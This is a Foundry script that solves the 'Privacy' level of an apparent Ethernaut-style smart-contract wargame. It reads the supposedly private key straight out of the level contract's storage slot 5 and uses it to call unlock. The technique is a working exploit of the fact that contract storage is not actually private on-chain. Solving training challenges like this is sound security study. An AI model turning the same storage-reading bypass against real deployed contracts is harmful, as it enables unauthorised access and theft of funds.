// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import {Privacy} from "../src/levels/Privacy.sol";

contract PrivacyScript is Script {
    Privacy instance = Privacy(payable(0x674D4cF4CC07754Df3BdF8DBDE734CB84413D300));

    function run() external {
        vm.startBroadcast();
        console.log("Privacy Contract is locked?", instance.locked());
        console.log("Retrieving key...");
        bytes32 key = vm.load(address(instance), bytes32(uint256(5)));
        console.log("Unlocking...");
        instance.unlock(bytes16(key));
        console.log("Privacy Contract is already locked?", instance.locked());
        vm.stopBroadcast();
    }
}
